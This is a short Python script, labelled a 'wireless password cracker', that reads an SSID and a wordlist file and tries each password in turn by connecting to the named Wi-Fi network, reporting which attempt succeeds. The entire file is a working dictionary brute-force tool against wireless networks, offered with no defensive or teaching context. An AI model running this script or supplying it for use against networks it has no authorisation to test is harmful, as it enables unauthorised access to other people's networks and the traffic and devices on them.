# wireless password cracker 2021. Requires wireless adapter running.

# --- Libraries ---
from wireless import Wireless

#user input
wire = Wireless()
ssid = input("What is the SSID? ")
passwordList = input("Enter path to list of passwords: ")

with open(passwordList, "r") as file:
    for line in file.readlines():
        if wire.connect(ssid, password=line.strip()) == True:
            print("[+]  " + line.strip() + " - success!")
        else:
            print("[-] " + line.strip() + " - failed.")